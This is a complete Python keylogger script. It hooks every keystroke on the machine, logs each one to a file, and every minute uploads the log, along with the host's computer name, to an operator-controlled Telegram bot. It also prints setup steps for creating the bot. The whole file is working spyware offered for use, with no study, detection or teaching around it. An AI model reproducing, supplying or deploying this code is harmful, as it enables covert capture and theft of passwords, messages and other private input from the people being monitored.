import keyboard
import requests
import threading
import time
import os
from datetime import datetime

class KeyloggerWithTelegram:
    def __init__(self, telegram_bot_token, telegram_chat_id, log_file="keylog.txt", upload_interval=60):
        self.telegram_bot_token = telegram_bot_token
        self.telegram_chat_id = telegram_chat_id
        self.log_file = log_file
        self.upload_interval = upload_interval  # in seconds
        self.log_buffer = []
        self.is_running = False
        
    def on_key_event(self, event):
        """Callback function for key events"""
        key_data = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'key': event.name,
            'event_type': event.event_type,
            'scan_code': event.scan_code
        }
        
        log_entry = f"[{key_data['timestamp']}] {key_data['event_type']}: {key_data['key']}\n"
        
        # Add to buffer and write to file
        self.log_buffer.append(log_entry)
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry)
    
    def send_to_telegram(self, file_path=None, message=None):
        """Send file or message to Telegram"""
        if file_path and os.path.exists(file_path):
            # Send file
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {'chat_id': self.telegram_chat_id}
            
            if message:
                data['caption'] = message
                
            try:
                response = requests.post(url, files=files, data=data)
                if response.status_code == 200:
                    print("File sent to Telegram successfully")
                    # Clear the log file after successful upload
                    open(self.log_file, 'w').close()
                else:
                    print(f"Failed to send file: {response.text}")
            except Exception as e:
                print(f"Error sending to Telegram: {e}")
            finally:
                files['document'].close()
                
        elif message:
            # Send message only
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {
                'chat_id': self.telegram_chat_id,
                'text': message
            }
            try:
                requests.post(url, data=data)
            except Exception as e:
                print(f"Error sending message: {e}")
    
    def periodic_upload(self):
        """Periodically upload the log file to Telegram"""
        while self.is_running:
            time.sleep(self.upload_interval)
            if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
                file_size = os.path.getsize(self.log_file)
                message = f"📊 Keylog Update\n📁 File: {self.log_file}\n📏 Size: {file_size} bytes\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                self.send_to_telegram(self.log_file, message)
    
    def start(self):
        """Start the keylogger"""
        print("Starting keylogger...")
        print("Press Ctrl+C to stop")
        
        # Initialize log file
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write(f"Keylogger Started at {datetime.now()}\n")
            f.write("="*50 + "\n")
        
        self.is_running = True
        
        # Start periodic upload thread
        upload_thread = threading.Thread(target=self.periodic_upload)
        upload_thread.daemon = True
        upload_thread.start()
        
        # Send startup message to Telegram
        startup_msg = f"🔑 Keylogger Started\n🖥️ Host: {os.environ.get('COMPUTERNAME', 'Unknown')}\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        self.send_to_telegram(message=startup_msg)
        
        # Setup keyboard hook
        keyboard.hook(self.on_key_event)
        
        try:
            # Keep the program running
            keyboard.wait()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the keylogger"""
        print("\nStopping keylogger...")
        self.is_running = False
        
        # Send final log if exists
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
            final_msg = f"🛑 Keylogger Stopped\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            self.send_to_telegram(self.log_file, final_msg)
        else:
            self.send_to_telegram(message="🛑 Keylogger Stopped - No data collected")
        
        # Unhook keyboard
        keyboard.unhook_all()
        
        # Clean up log file
        if os.path.exists(self.log_file):
            os.remove(self.log_file)

def setup_telegram():
    """Helper function to setup Telegram credentials"""
    print("Telegram Bot Setup:")
    print("1. Create a bot with @BotFather on Telegram")
    print("2. Get the bot token")
    print("3. Start a chat with your bot")
    print("4. Get your chat ID by sending a message to @userinfobot")
    print()
    
    bot_token = input("Enter your bot token: ").strip()
    chat_id = input("Enter your chat ID: ").strip()
    
    return bot_token, chat_id

if __name__ == "__main__":
    # Setup Telegram credentials
    bot_token, chat_id = setup_telegram()
    
    # Configuration
    config = {
        'telegram_bot_token': bot_token,
        'telegram_chat_id': chat_id,
        'log_file': 'keylog.txt',
        'upload_interval': 60  # Upload every 60 seconds
    }
    
    # Create and start keylogger
    keylogger = KeyloggerWithTelegram(**config)
    
    try:
        keylogger.start()
    except Exception as e:
        print(f"Error: {e}")
    finally:
        keylogger.stop()
